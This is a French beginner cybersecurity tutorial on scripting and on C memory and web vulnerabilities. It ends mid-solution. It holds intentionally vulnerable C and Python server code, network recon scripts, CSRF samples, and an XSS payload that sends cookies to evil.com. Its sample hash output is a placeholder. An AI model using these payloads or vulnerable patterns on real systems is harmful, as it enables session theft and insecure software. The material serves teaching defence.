---
tags:
  - Cybersécurité
  - Débutant
  - Pratique
description: "Programmation et scripting pour la cybersécurité : Python, Bash, PowerShell, C et JavaScript"
estimated_time: "80 min"
fiche_number: 4
total_fiches: 4
cursus: "Phase 1 - Fondamentaux informatiques"
---

# 04 - Programmation et Scripting pour la Cybersécurité

> **En bref** : À la fin de cette fiche, tu sauras écrire des scripts Python pour l'automatisation et l'analyse réseau, utiliser Bash et PowerShell pour l'administration système, comprendre les vulnérabilités mémoire en C (buffer overflow, use-after-free), et identifier les vecteurs d'attaque web en JavaScript (XSS, CSRF). Lecture estimée : 80 min.


## Prérequis

- [01 - Architecture matérielle et fonctionnement des ordinateurs](01-architecture-materielle.md)
- [02 - Systèmes d'exploitation - Théorie et Pratique](02-systemes-exploitation.md)
- [03 - Réseaux - Modèles, Protocoles et Infrastructure](03-reseaux-protocoles.md)

## Objectif de cette fiche

À la fin de cette fiche, tu sauras écrire des scripts Python pour l'automatisation et l'analyse réseau, utiliser Bash et PowerShell pour l'administration système, comprendre les vulnérabilités mémoire en C (buffer overflow, use-after-free), et identifier les vecteurs d'attaque web en JavaScript (XSS, CSRF).

---

## Concepts

Cette section explique tous les concepts nécessaires. Lis-la entièrement avant de passer aux étapes pratiques.

### Pourquoi programmer en cybersécurité ?

**Définition** : En cybersécurité, la programmation sert à automatiser des tâches répétitives, écrire des outils de test de sécurité, analyser des malwares, et comprendre le code source des applications vulnérables.

**Le problème que la programmation résout en cybersécurité** :

Sans compétences en programmation, voici les problèmes rencontrés :

1. **Dépendance aux outils existants** : tu ne peux utiliser que des outils créés par d'autres, sans les adapter à ton besoin
2. **Pas d'automatisation** : tu dois répéter manuellement des actions (scan, analyse, rapport)
3. **Incompréhension des vulnérabilités** : impossible de comprendre un buffer overflow sans connaître le C
4. **Pas d'analyse de malware** : impossible de lire et comprendre le code d'un programme malveillant

**Comment la programmation résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Dépendance aux outils | Python permet de créer tes propres outils sur mesure |
| Pas d'automatisation | Bash/PowerShell automatisent l'administration système |
| Incompréhension des vulnérabilités | Le C explique comment fonctionnent les attaques mémoire |
| Pas d'analyse de malware | La lecture de code (Python, C, JavaScript) permet de comprendre les malwares |

**Analogie concrète** : Un pentesteur (testeur d'intrusion) sans compétences en programmation est comme un mécanicien qui sait utiliser une clé à molette mais ne comprend pas comment fonctionne un moteur. Il peut serrer des boulons (utiliser des outils), mais il ne peut pas diagnostiquer ni réparer un problème mécanique complexe.

**Langages utilisés en cybersécurité** :

| Langage | Utilisation en cybersécurité | Priorité |
| ------- | ---------------------------- | -------- |
| Python | Scripting, automatisation, outils réseau, exploit dev | Essentiel |
| Bash | Administration Linux, automatisation serveur | Essentiel |
| PowerShell | Administration Windows, post-exploitation | Important |
| C | Comprendre les vulnérabilités mémoire, shellcode | Important |
| JavaScript | Comprendre les attaques web (XSS, CSRF) | Utile |
| SQL | Comprendre les injections SQL | Utile |
| Assembly | Reverse engineering, analyse de malware | Avancé |

---

### Python pour la cybersécurité

**Définition** : Python est un langage de programmation interprété, polyvalent et lisible. C'est le langage le plus utilisé en cybersécurité pour l'automatisation, l'écriture d'outils et l'analyse réseau.

**Le problème que Python résout** :

Sans Python, voici les problèmes rencontrés :

1. **Outils monolithiques** : les outils existants ne font pas exactement ce dont tu as besoin
2. **Tâches répétitives** : scanner 1000 machines manuellement prendrait des semaines
3. **Pas de prototypage rapide** : écrire un outil en C prend beaucoup plus de temps

**Ce que Python n'est PAS** :

- Python n'est pas adapté au code bas niveau (accès mémoire, shellcode). Pour cela, on utilise C ou Assembly.
- Python n'est pas le plus performant. Pour des outils nécessitant des performances maximales, on utilise C, Go ou Rust.

#### Modules Python essentiels pour la cybersécurité

| Module | Rôle | Exemple d'utilisation |
| ------ | ---- | --------------------- |
| `socket` | Communication réseau bas niveau | Scanner de ports, client/serveur TCP |
| `requests` | Requêtes HTTP simplifiées | Tester des API, fuzzing web |
| `scapy` | Création et manipulation de paquets réseau | ARP scan, SYN scan, sniffing |
| `subprocess` | Exécution de commandes système | Automatiser nmap, tcpdump |
| `os` / `sys` | Interaction avec le système d'exploitation | Parcourir des fichiers, variables d'environnement |
| `hashlib` | Fonctions de hachage (MD5, SHA256) | Vérifier l'intégrité de fichiers |
| `re` | Expressions régulières | Extraire des motifs (IP, emails, URLs) |
| `paramiko` | Client SSH en Python | Automatiser des connexions SSH |
| `pwntools` | Framework d'exploitation | Écrire des exploits, interagir avec des binaires |

#### Bases de Python - Rappel rapide

**Variables et types** :

```python
# Chaîne de caractères (texte)
cible = "192.168.1.1"

# Entier (nombre)
port = 80

# Liste (collection ordonnée)
ports_communs = [21, 22, 80, 443, 8080]

# Dictionnaire (association clé-valeur)
service = {"port": 80, "nom": "HTTP", "ouvert": True}

# Booléen (vrai/faux)
est_vulnerable = False
```

**Structures de contrôle** :

```python
# Condition
if port == 80:
    print("Service HTTP détecté")
elif port == 443:
    print("Service HTTPS détecté")
else:
    print(f"Port {port} inconnu")

# Boucle for (parcourir une liste)
for port in ports_communs:
    print(f"Scan du port {port}...")

# Boucle while
tentatives = 0
while tentatives < 3:
    print(f"Tentative {tentatives + 1}")
    tentatives += 1
```

**Fonctions** :

```python
def scanner_port(ip, port):
    """Teste si un port est ouvert sur une adresse IP donnée."""
    import socket
    # Crée un socket TCP
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Définit un timeout de 1 seconde
    sock.settimeout(1)
    # Tente de se connecter
    resultat = sock.connect_ex((ip, port))
    # Ferme le socket
    sock.close()
    # connect_ex retourne 0 si la connexion réussit
    return resultat == 0
```

---

### Bash pour l'administration système

**Définition** : Bash (Bourne Again Shell) est l'interpréteur de commandes par défaut sur la plupart des distributions Linux. En cybersécurité, Bash est utilisé pour automatiser l'administration système, écrire des scripts de reconnaissance et enchaîner des outils en ligne de commande.

**Le problème que Bash résout** :

Sans scripts Bash, voici les problèmes rencontrés :

1. **Actions manuelles répétitives** : vérifier les logs de 50 serveurs un par un
2. **Pas de pipeline** : impossible d'enchaîner automatiquement plusieurs outils
3. **Pas de planification** : impossible d'exécuter des tâches à heure fixe (cron)

**Ce que Bash n'est PAS** :

- Bash n'est pas un langage de programmation complet. Pour des programmes complexes (interfaces graphiques, traitement de données avancé), utilise Python.
- Bash n'est pas portable sur Windows nativement. Pour Windows, utilise PowerShell.

#### Bases de Bash - Rappel rapide

```bash
#!/bin/bash
# Shebang : indique que ce script doit être exécuté par bash

# Variables (pas d'espace autour du =)
CIBLE="192.168.1.0/24"
PORT=80

# Affichage
echo "Scan du réseau $CIBLE sur le port $PORT"

# Condition
if [ "$PORT" -eq 80 ]; then
    echo "Scan HTTP"
fi

# Boucle for
for ip in 192.168.1.{1..254}; do
    # Ping avec timeout de 1 seconde, 1 seul paquet
    ping -c 1 -W 1 "$ip" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "$ip est actif"
    fi
done

# Redirection et pipes
# Cherche les connexions SSH échouées dans les logs
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
```

---

### PowerShell pour l'administration Windows

**Définition** : PowerShell est le shell et langage de scripting de Microsoft. En cybersécurité, il est utilisé pour l'administration Windows, la post-exploitation et l'analyse forensique.

**Le problème que PowerShell résout** :

Sans PowerShell, voici les problèmes rencontrés :

1. **Administration Windows limitée** : l'interface graphique ne permet pas d'automatiser les tâches
2. **Pas d'accès aux objets Windows** : CMD ne peut pas manipuler le registre, les services ou Active Directory efficacement
3. **Pas de scripting puissant** : CMD est limité en logique conditionnelle et en manipulation de données

**Ce que PowerShell n'est PAS** :

- PowerShell n'est pas CMD. CMD est l'ancien interpréteur de commandes Windows, limité. PowerShell manipule des objets .NET.
- PowerShell n'est pas exclusif à Windows. PowerShell Core (7.x) fonctionne aussi sur Linux et macOS.

#### Bases de PowerShell - Rappel rapide

```powershell
# Variables (préfixe $)
$cible = "192.168.1.1"
$port = 80

# Affichage
Write-Host "Scan de $cible sur le port $port"

# Condition
if ($port -eq 80) {
    Write-Host "Service HTTP"
}

# Boucle
1..254 | ForEach-Object {
    $ip = "192.168.1.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
        Write-Host "$ip est actif"
    }
}

# Lister les processus en cours
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10

# Vérifier les programmes au démarrage (clés de registre)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

---

### Le langage C et les vulnérabilités mémoire

**Définition** : Le C est un langage de programmation bas niveau qui donne un accès direct à la mémoire. En cybersécurité, comprendre le C est essentiel pour comprendre les vulnérabilités mémoire : buffer overflow, use-after-free, format string, etc.

**Le problème que la connaissance du C résout** :

Sans connaissance du C, voici les problèmes rencontrés :

1. **Incompréhension des exploits** : la majorité des vulnérabilités critiques (CVE) concernent des programmes en C/C++
2. **Pas de reverse engineering** : les binaires compilés correspondent à du code C/C++
3. **Pas de compréhension de la pile** : impossible de comprendre un buffer overflow sans connaître la pile d'exécution

#### Qu'est-ce qu'un buffer overflow ?

**Définition** : Un buffer overflow (dépassement de tampon) se produit quand un programme écrit plus de données qu'un buffer ne peut en contenir. Les données débordent et écrasent les zones mémoire adjacentes.

**Le problème que le buffer overflow exploite** :

En C, le programmeur est responsable de la gestion de la mémoire. Si le programme ne vérifie pas la taille des données avant de les copier dans un buffer, un attaquant peut :

1. **Écraser la valeur de retour** : rediriger l'exécution vers du code malveillant
2. **Écraser des variables** : modifier le comportement du programme
3. **Injecter du shellcode** : placer et exécuter du code arbitraire

**Exemple de code vulnérable** :

```c
#include <stdio.h>
#include <string.h>

void fonction_vulnerable(char *entree) {
    // Buffer de 64 octets sur la pile
    char buffer[64];
    // strcpy ne vérifie PAS la taille de l'entrée
    // Si entree fait plus de 64 octets, il y a buffer overflow
    strcpy(buffer, entree);
    printf("Contenu : %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        fonction_vulnerable(argv[1]);
    }
    return 0;
}
```

**Code corrigé** :

```c
#include <stdio.h>
#include <string.h>

void fonction_securisee(char *entree) {
    char buffer[64];
    // strncpy copie au maximum 63 caractères (64 - 1 pour le \0)
    strncpy(buffer, entree, sizeof(buffer) - 1);
    // Assure que la chaîne est terminée par \0
    buffer[sizeof(buffer) - 1] = '\0';
    printf("Contenu : %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        fonction_securisee(argv[1]);
    }
    return 0;
}
```

**Organisation de la pile (stack)** :

```text
Adresses hautes
┌─────────────────────┐
│ Adresse de retour    │ ← L'attaquant veut écraser cette valeur
├─────────────────────┤
│ Base pointer (EBP)   │ ← Sauvegarde du pointeur de base
├─────────────────────┤
│ buffer[64]           │ ← Le buffer de 64 octets
│                      │    Si on écrit plus de 64 octets,
│                      │    on écrase EBP puis l'adresse de retour
├─────────────────────┤
│ Variables locales    │
└─────────────────────┘
Adresses basses
```

**Protections modernes contre le buffer overflow** :

| Protection | Description |
| ---------- | ----------- |
| Stack Canary | Valeur sentinelle placée avant l'adresse de retour, vérifiée au retour de la fonction |
| ASLR | Randomisation des adresses mémoire (pile, tas, bibliothèques) |
| DEP/NX | Pages mémoire non exécutables (la pile ne peut pas exécuter de code) |
| PIE | Position-Independent Executable, le binaire est chargé à une adresse aléatoire |

#### Qu'est-ce qu'un use-after-free ?

**Définition** : Un use-after-free se produit quand un programme continue d'utiliser un pointeur vers une zone mémoire qui a déjà été libérée (freed). Un attaquant peut allouer de nouvelles données à cet emplacement et contrôler ce que le programme lit ou exécute.

**Exemple simplifié** :

```c
#include <stdlib.h>
#include <string.h>

typedef struct {
    char nom[32];
    void (*action)(void);  // Pointeur de fonction
} Utilisateur;

int main() {
    // Alloue une structure Utilisateur sur le tas (heap)
    Utilisateur *user = malloc(sizeof(Utilisateur));
    strcpy(user->nom, "Alice");

    // Libère la mémoire
    free(user);

    // ERREUR : user pointe toujours vers la mémoire libérée
    // Un attaquant pourrait allouer de nouvelles données ici
    // et contrôler le pointeur de fonction user->action
    user->action();  // Use-after-free : exécute du code contrôlé par l'attaquant

    return 0;
}
```

**Code corrigé** :

```c
// Après free, mettre le pointeur à NULL
free(user);
user = NULL;  // Le pointeur ne pointe plus vers la mémoire libérée

// Vérifier avant utilisation
if (user != NULL) {
    user->action();
}
```

---

### JavaScript et les attaques web

**Définition** : JavaScript est le langage de programmation exécuté dans les navigateurs web. En cybersécurité, comprendre JavaScript est nécessaire pour comprendre les attaques web comme le XSS (Cross-Site Scripting) et le CSRF (Cross-Site Request Forgery).

**Le problème que la connaissance du JavaScript résout** :

Sans connaissance du JavaScript, voici les problèmes rencontrés :

1. **Incompréhension du XSS** : impossible de comprendre comment du code malveillant s'exécute dans le navigateur d'une victime
2. **Pas d'audit web** : impossible de vérifier si une application web est vulnérable
3. **Pas de compréhension du DOM** : impossible de comprendre comment un attaquant manipule la page web

#### Qu'est-ce que le XSS (Cross-Site Scripting) ?

**Définition** : Le XSS est une vulnérabilité web qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page web consultée par d'autres utilisateurs.

**Types de XSS** :

| Type | Description | Persistance |
| ---- | ----------- | ----------- |
| Reflected XSS | Le code malveillant est dans l'URL, réfléchi par le serveur | Non persistant |
| Stored XSS | Le code malveillant est stocké dans la base de données (commentaire, profil) | Persistant |
| DOM-based XSS | Le code malveillant manipule le DOM côté client, sans passer par le serveur | Non persistant |

**Exemple de XSS reflected** :

```javascript
// URL malveillante envoyée à la victime :
// https://site.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

// Si le serveur affiche le paramètre q sans l'assainir :
// <p>Résultats pour : <script>document.location='https://evil.com/steal?cookie='+document.cookie</script></p>

// Le navigateur de la victime exécute le script
// et envoie ses cookies (dont le cookie de session) à l'attaquant
```

**Protection contre le XSS** :

```javascript
// MAUVAIS : insertion directe de l'entrée utilisateur dans le HTML
document.getElementById("resultat").innerHTML = entreeUtilisateur;

// BON : utiliser textContent au lieu de innerHTML
// textContent traite le contenu comme du texte, pas comme du HTML
document.getElementById("resultat").textContent = entreeUtilisateur;

// BON : échapper les caractères spéciaux HTML côté serveur
// < devient &lt;
// > devient &gt;
// " devient &quot;
// ' devient &#39;
```

#### Qu'est-ce que le CSRF (Cross-Site Request Forgery) ?

**Définition** : Le CSRF est une attaque qui force le navigateur d'une victime authentifiée à envoyer une requête non désirée vers un site sur lequel elle est connectée.

**Exemple de CSRF** :

```javascript
// L'attaquant place ce code sur sa page web malveillante
// Quand la victime (connectée à sa banque) visite cette page,
// son navigateur envoie automatiquement la requête avec ses cookies

// Méthode 1 : image invisible
// <img src="https://banque.com/virement?montant=1000&destinataire=attaquant" />

// Méthode 2 : formulaire auto-soumis
// <form action="https://banque.com/virement" method="POST" id="csrf-form">
//   <input type="hidden" name="montant" value="1000" />
//   <input type="hidden" name="destinataire" value="attaquant" />
// </form>
// <script>document.getElementById('csrf-form').submit();</script>
```

**Protection contre le CSRF** :

- Token CSRF : un jeton unique et imprévisible inclus dans chaque formulaire, vérifié par le serveur
- Attribut SameSite sur les cookies : empêche l'envoi des cookies dans les requêtes cross-origin
- Vérification de l'en-tête `Referer` ou `Origin`

---

## Étapes Pratiques

### Étape 1 : Écrire un scanner de ports en Python

```python
#!/usr/bin/env python3
"""Scanner de ports TCP simple."""

import socket
import sys

def scan_port(ip, port, timeout=1):
    """Teste si un port TCP est ouvert sur une adresse IP.

    Args:
        ip: Adresse IP cible
        port: Numéro de port à tester
        timeout: Durée maximale d'attente en secondes

    Returns:
        True si le port est ouvert, False sinon
    """
    try:
        # Crée un socket TCP (AF_INET = IPv4, SOCK_STREAM = TCP)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Définit le timeout de connexion
        sock.settimeout(timeout)
        # Tente de se connecter (retourne 0 si succès)
        result = sock.connect_ex((ip, port))
        # Ferme le socket dans tous les cas
        sock.close()
        return result == 0
    except socket.error:
        return False


def main():
    """Point d'entrée principal du scanner."""
    if len(sys.argv) != 2:
        print(f"Usage : {sys.argv[0]} <adresse_ip>")
        print(f"Exemple : {sys.argv[0]} 192.168.1.1")
        sys.exit(1)

    cible = sys.argv[1]
    # Liste des ports les plus courants à scanner
    ports_communs = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
                     993, 995, 3306, 3389, 5432, 8080, 8443]

    print(f"Scan de {cible}...")
    print("-" * 40)

    ports_ouverts = []
    for port in ports_communs:
        if scan_port(cible, port):
            # Tente de récupérer le nom du service associé au port
            try:
                service = socket.getservbyport(port)
            except OSError:
                service = "inconnu"
            print(f"[OUVERT] Port {port} ({service})")
            ports_ouverts.append(port)

    print("-" * 40)
    print(f"Scan terminé. {len(ports_ouverts)} port(s) ouvert(s) sur {len(ports_communs)} testés.")


if __name__ == "__main__":
    main()
```

**Pour exécuter** :

```bash
# Rendre le script exécutable
chmod +x scanner.py

# Scanner une machine (remplace par une IP de ton réseau)
python3 scanner.py 192.168.1.1
```

**Résultat attendu** :

```text
Scan de 192.168.1.1...
----------------------------------------
[OUVERT] Port 22 (ssh)
[OUVERT] Port 80 (http)
[OUVERT] Port 443 (https)
----------------------------------------
Scan terminé. 3 port(s) ouvert(s) sur 17 testés.
```

---

### Étape 2 : Calculer des hashes de fichiers en Python

```python
#!/usr/bin/env python3
"""Calcul de hash MD5 et SHA256 pour vérifier l'intégrité de fichiers."""

import hashlib
import sys
import os


def calculer_hash(fichier, algorithme="sha256"):
    """Calcule le hash d'un fichier.

    Args:
        fichier: Chemin vers le fichier
        algorithme: Algorithme de hachage (md5, sha256, sha512)

    Returns:
        Le hash hexadécimal du fichier
    """
    # Crée l'objet de hachage selon l'algorithme choisi
    h = hashlib.new(algorithme)

    # Lit le fichier par blocs de 8 Ko pour gérer les gros fichiers
    with open(fichier, "rb") as f:
        while True:
            bloc = f.read(8192)
            if not bloc:
                break
            # Met à jour le hash avec chaque bloc lu
            h.update(bloc)

    # Retourne le hash sous forme hexadécimale
    return h.hexdigest()


def main():
    if len(sys.argv) < 2:
        print(f"Usage : {sys.argv[0]} <fichier> [fichier2 ...]")
        sys.exit(1)

    for fichier in sys.argv[1:]:
        if not os.path.isfile(fichier):
            print(f"[ERREUR] {fichier} n'existe pas")
            continue

        taille = os.path.getsize(fichier)
        md5 = calculer_hash(fichier, "md5")
        sha256 = calculer_hash(fichier, "sha256")

        print(f"Fichier  : {fichier}")
        print(f"Taille   : {taille} octets")
        print(f"MD5      : {md5}")
        print(f"SHA256   : {sha256}")
        print()


if __name__ == "__main__":
    main()
```

**Pour exécuter** :

```bash
# Calculer le hash d'un fichier
python3 hash_fichier.py /etc/passwd
```

**Résultat attendu** :

```text
Fichier  : /etc/passwd
Taille   : 2847 octets
MD5      : a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4
SHA256   : 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
```

---

### Étape 3 : Script Bash de reconnaissance réseau

```bash
#!/bin/bash
# Script de reconnaissance réseau basique
# Découvre les machines actives et les ports ouverts sur un sous-réseau

# Vérifie qu'un argument est fourni
if [ -z "$1" ]; then
    echo "Usage : $0 <réseau>"
    echo "Exemple : $0 192.168.1"
    exit 1
fi

RESEAU="$1"
RAPPORT="recon-$(date +%Y%m%d-%H%M%S).txt"

echo "=== RECONNAISSANCE RÉSEAU ===" | tee "$RAPPORT"
echo "Réseau : ${RESEAU}.0/24" | tee -a "$RAPPORT"
echo "Date : $(date)" | tee -a "$RAPPORT"
echo "" | tee -a "$RAPPORT"

# Phase 1 : Découverte des hôtes actifs par ping
echo "--- Phase 1 : Découverte des hôtes ---" | tee -a "$RAPPORT"
HOTES_ACTIFS=()

for i in $(seq 1 254); do
    IP="${RESEAU}.${i}"
    # Ping avec timeout de 1 seconde, 1 seul paquet
    # Redirige stdout et stderr vers /dev/null
    ping -c 1 -W 1 "$IP" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[ACTIF] $IP" | tee -a "$RAPPORT"
        HOTES_ACTIFS+=("$IP")
    fi
done

echo "" | tee -a "$RAPPORT"
echo "Hôtes actifs : ${#HOTES_ACTIFS[@]}" | tee -a "$RAPPORT"
echo "" | tee -a "$RAPPORT"

# Phase 2 : Scan des ports courants sur les hôtes actifs
echo "--- Phase 2 : Scan des ports ---" | tee -a "$RAPPORT"
PORTS="22 80 443 3389 8080"

for IP in "${HOTES_ACTIFS[@]}"; do
    echo "Scan de $IP :" | tee -a "$RAPPORT"
    for PORT in $PORTS; do
        # Utilise /dev/tcp (fonctionnalité bash) pour tester un port
        # Timeout de 1 seconde avec la commande timeout
        (echo > /dev/tcp/"$IP"/"$PORT") 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "  [OUVERT] Port $PORT" | tee -a "$RAPPORT"
        fi
    done
done

echo "" | tee -a "$RAPPORT"
echo "Rapport sauvegardé dans $RAPPORT"
```

**Pour exécuter** :

```bash
# Rendre le script exécutable
chmod +x recon.sh

# Lancer la reconnaissance sur le réseau local
./recon.sh 192.168.1
```

**Résultat attendu** :

```text
=== RECONNAISSANCE RÉSEAU ===
Réseau : 192.168.1.0/24
Date : jeu. 19 mars 2026 14:30:00 CET

--- Phase 1 : Découverte des hôtes ---
[ACTIF] 192.168.1.1
[ACTIF] 192.168.1.50
[ACTIF] 192.168.1.100

Hôtes actifs : 3

--- Phase 2 : Scan des ports ---
Scan de 192.168.1.1 :
  [OUVERT] Port 80
  [OUVERT] Port 443
Scan de 192.168.1.50 :
  [OUVERT] Port 22
Scan de 192.168.1.100 :
  [OUVERT] Port 22
  [OUVERT] Port 80
```

---

### Étape 4 : Compiler et tester un buffer overflow en C

```bash
# Crée le fichier C vulnérable
cat > vuln.c << 'CCODE'
#include <stdio.h>
#include <string.h>

void fonction_vulnerable(char *entree) {
    char buffer[64];
    printf("Adresse du buffer : %p\n", buffer);
    // Vulnérable : strcpy ne vérifie pas la taille
    strcpy(buffer, entree);
    printf("Contenu : %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage : %s <texte>\n", argv[0]);
        return 1;
    }
    fonction_vulnerable(argv[1]);
    printf("Retour normal de la fonction.\n");
    return 0;
}
CCODE

# Compile SANS les protections pour la démonstration
# -fno-stack-protector : désactive le stack canary
# -z execstack : rend la pile exécutable
# -no-pie : désactive le PIE (Position Independent Executable)
gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie -g
```

```bash
# Test normal (entrée de 10 caractères, pas de dépassement)
./vuln "AAAAAAAAAA"
```

**Résultat attendu** :

```text
Adresse du buffer : 0x7fffffffdcc0
Contenu : AAAAAAAAAA
Retour normal de la fonction.
```

```bash
# Test avec dépassement (plus de 64 caractères)
# Utilise python pour générer une chaîne de 80 'A'
./vuln $(python3 -c "print('A' * 80)")
```

**Résultat attendu** :

```text
Adresse du buffer : 0x7fffffffdcc0
Contenu : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

Le "Segmentation fault" prouve que le buffer overflow a écrasé l'adresse de retour avec des 'A' (0x41), et le processeur a tenté de sauter à une adresse invalide.

---

### Étape 5 : Détecter une vulnérabilité XSS simple

Crée un petit serveur web vulnérable pour comprendre le XSS :

```python
#!/usr/bin/env python3
"""Serveur web vulnérable au XSS (à des fins pédagogiques uniquement)."""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs


class ServeurVulnerable(BaseHTTPRequestHandler):
    """Serveur HTTP qui affiche l'entrée utilisateur sans l'assainir."""

    def do_GET(self):
        """Traite les requêtes GET."""
        # Parse l'URL pour extraire les paramètres
        params = parse_qs(urlparse(self.path).query)
        nom = params.get("nom", ["Visiteur"])[0]

        # VULNÉRABLE : le paramètre nom est inséré directement dans le HTML
        # sans échappement des caractères spéciaux
        html = f"""<!DOCTYPE html>
<html>
<head><title>Page vulnérable</title></head>
<body>
    <h1>Bonjour, {nom} !</h1>
    <form>
        <input type="text" name="nom" placeholder="Ton nom" />
        <button type="submit">Envoyer</button>
    </form>
</body>
</html>"""

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode())


def main():
    serveur = HTTPServer(("127.0.0.1", 8888), ServeurVulnerable)
    print("Serveur vulnérable démarré sur http://127.0.0.1:8888")
    print("Teste avec : http://127.0.0.1:8888/?nom=<script>alert('XSS')</script>")
    print("Ctrl+C pour arrêter")
    serveur.serve_forever()


if __name__ == "__main__":
    main()
```

**Pour tester** :

```bash
# Lance le serveur vulnérable
python3 serveur_vuln.py &

# Requête normale
curl "http://127.0.0.1:8888/?nom=Alice"

# Requête avec XSS
curl "http://127.0.0.1:8888/?nom=<script>alert('XSS')</script>"

# Arrête le serveur
kill %1
```

**Résultat attendu de la requête XSS** :

```text
<!DOCTYPE html>
<html>
<head><title>Page vulnérable</title></head>
<body>
    <h1>Bonjour, <script>alert('XSS')</script> !</h1>
...
```

Le script `<script>alert('XSS')</script>` est injecté directement dans le HTML. Dans un navigateur, il s'exécuterait et afficherait une alerte.

---

## Commandes Utiles

| Commande | Action |
| -------- | ------ |
| `python3 script.py` | Exécute un script Python |
| `pip3 install module` | Installe un module Python |
| `chmod +x script.sh` | Rend un script Bash exécutable |
| `bash -x script.sh` | Exécute un script Bash en mode debug |
| `gcc -o prog prog.c` | Compile un programme C |
| `gcc -g -o prog prog.c` | Compile avec les symboles de debug |
| `gdb ./prog` | Lance le débogueur GDB sur un programme |
| `strace ./prog` | Trace les appels système d'un programme |
| `ltrace ./prog` | Trace les appels de bibliothèques |
| `objdump -d prog` | Désassemble un binaire |
| `file prog` | Identifie le type d'un fichier binaire |
| `strings prog` | Extrait les chaînes de caractères d'un binaire |
| `checksec --file=prog` | Vérifie les protections d'un binaire (ASLR, NX, canary) |

---

## Pièges Fréquents

### Piège 1 : Oublier le shebang dans un script

**Problème** : Exécuter `./script.sh` sans la ligne `#!/bin/bash` en première ligne. Le système ne sait pas quel interpréteur utiliser et peut produire des erreurs cryptiques.

**Solution** : Toujours ajouter le shebang en première ligne :

- Bash : `#!/bin/bash`
- Python : `#!/usr/bin/env python3`

---

### Piège 2 : Utiliser Python 2 au lieu de Python 3

**Problème** : Certains systèmes ont encore Python 2 installé. La commande `python` peut pointer vers Python 2, ce qui cause des erreurs de syntaxe (print sans parenthèses, etc.).

**Solution** : Utilise toujours `python3` explicitement, jamais `python`. Vérifie avec `python3 --version`.

---

### Piège 3 : Tester des exploits sur des systèmes non autorisés

**Problème** : Scanner des ports ou tester des vulnérabilités sur des machines sans autorisation peut constituer une infraction (en France : art. 323-1 et s. du Code pénal sur l'accès frauduleux à un système, selon les faits) et expose à des poursuites ou à des sanctions contractuelles. La qualification exacte dépend des faits et de la juridiction ; en cas de doute, ne teste pas.

**Solution** : Utilise uniquement des environnements de test autorisés :

- Machines virtuelles locales (VirtualBox, VMware) que tu contrôles
- Plateformes de CTF avec règles d'usage claires : HackTheBox, TryHackMe
- Laboratoires dédiés sur ton propre réseau

---

### Piège 4 : Compiler du C sans protections et oublier de les réactiver

**Problème** : Pour étudier les buffer overflows, on compile avec `-fno-stack-protector`. Oublier de compiler avec les protections pour le code de production.

**Solution** : Les flags de compilation sans protection sont exclusivement pour l'apprentissage. En production, compile toujours avec les protections par défaut (stack canary, PIE, NX). Vérifie avec `checksec --file=programme`.

---

### Piège 5 : Stocker des mots de passe en clair dans les scripts

**Problème** : Écrire des mots de passe ou des clés API directement dans le code source.

**Solution** : Utilise des variables d'environnement ou des fichiers de configuration avec des permissions restrictives (chmod 600). Jamais de mots de passe dans le code.

```bash
# MAUVAIS
MOT_DE_PASSE="super_secret_123"

# BON : lire depuis une variable d'environnement
MOT_DE_PASSE="${DB_PASSWORD}"

# BON : lire depuis un fichier protégé
MOT_DE_PASSE=$(cat /etc/mon-app/credentials)
```

---

## Checklist de Validation

- [ ] Je sais écrire un script Python qui scanne des ports TCP
- [ ] Je sais calculer le hash SHA256 d'un fichier en Python
- [ ] Je sais écrire un script Bash de reconnaissance réseau
- [ ] Je connais les bases de PowerShell (variables, boucles, Get-Process)
- [ ] Je comprends ce qu'est un buffer overflow et pourquoi il se produit
- [ ] Je sais compiler un programme C avec et sans protections mémoire
- [ ] Je comprends la différence entre strcpy (vulnérable) et strncpy (sécurisé)
- [ ] Je sais expliquer ce qu'est le XSS et comment il fonctionne
- [ ] Je sais expliquer ce qu'est le CSRF et comment s'en protéger
- [ ] Je connais les règles légales concernant les tests de sécurité

---

## Exercice Pratique

**Énoncé** : Crée une boîte à outils de cybersécurité en Python. Ce programme doit proposer un menu avec 4 fonctionnalités :

1. Scanner de ports TCP sur une adresse IP donnée
2. Calculateur de hash (MD5 et SHA256) pour un fichier
3. Ping sweep (découverte d'hôtes actifs sur un sous-réseau /24)
4. Recherche DNS (résolution d'un nom de domaine en adresse IP)

**Indications** :

- Utilise les modules `socket`, `hashlib`, `subprocess` et `os`
- Chaque fonctionnalité doit être une fonction distincte
- Gère les erreurs (fichier inexistant, hôte injoignable, etc.)
- Affiche un menu clair et demande à l'utilisateur de choisir une option

**Résultat attendu** : Un fichier `toolkit.py` fonctionnel qui propose les 4 fonctionnalités.

---

## Solution de l'Exercice

> **Note** : Cette section contient la solution complète. Essaie d'abord de résoudre l'exercice par toi-même avant de consulter cette solution.

---

```python
#!/usr/bin/env python3
"""Boîte à outils de cybersécurité basique.

Ce programme propose 4 fonctionnalités :
1. Scanner de ports TCP
2. Calculateur de hash
3. Ping sweep
4. Recherche DNS
"""

import socket
import hashlib
import subprocess
import sys
import os

